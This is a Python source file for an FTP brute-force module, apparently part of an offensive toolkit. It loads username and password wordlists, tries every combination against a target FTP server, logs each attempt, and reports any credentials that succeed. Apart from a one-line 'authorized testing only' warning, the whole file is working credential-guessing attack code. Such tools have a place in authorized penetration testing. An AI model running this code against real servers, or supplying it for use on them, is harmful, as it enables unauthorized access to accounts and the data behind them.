#!/usr/bin/env python3
"""FTP Brute Force Module"""
from ftplib import FTP, error_perm
import threading
from queue import Queue

class FTPBrute:
    def __init__(self, host, port, users, wordlist, logger):
        self.host = host
        self.port = port
        self.users = self._load(users)
        self.passwords = self._load(wordlist)
        self.logger = logger
        self.found = []
        self.stop = threading.Event()

    def _load(self, path_or_value):
        try:
            with open(path_or_value) as f:
                return [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            return [path_or_value]

    def _try(self, user, password):
        if self.stop.is_set():
            return False
        try:
            ftp = FTP()
            ftp.connect(self.host, self.port, timeout=5)
            ftp.login(user, password)
            ftp.quit()
            return True
        except error_perm:
            return False
        except Exception as e:
            self.logger.debug(f"FTP error: {e}")
            return False

    def run(self):
        self.logger.info(f"[*] FTP BruteForce -> {self.host}:{self.port}")
        self.logger.warning("[!] For authorized testing only!")
        total = len(self.users) * len(self.passwords)
        self.logger.info(f"[*] {total} combinations to try...")

        for user in self.users:
            for pwd in self.passwords:
                if self.stop.is_set():
                    break
                self.logger.info(f"Trying {user}:{pwd}")
                if self._try(user, pwd):
                    self.logger.success(f"[FOUND] {user}:{pwd} @ {self.host}:{self.port}")
                    self.found.append({"user": user, "password": pwd})
                    self.stop.set()

        if not self.found:
            self.logger.warning("[-] No credentials found")
        return self.found
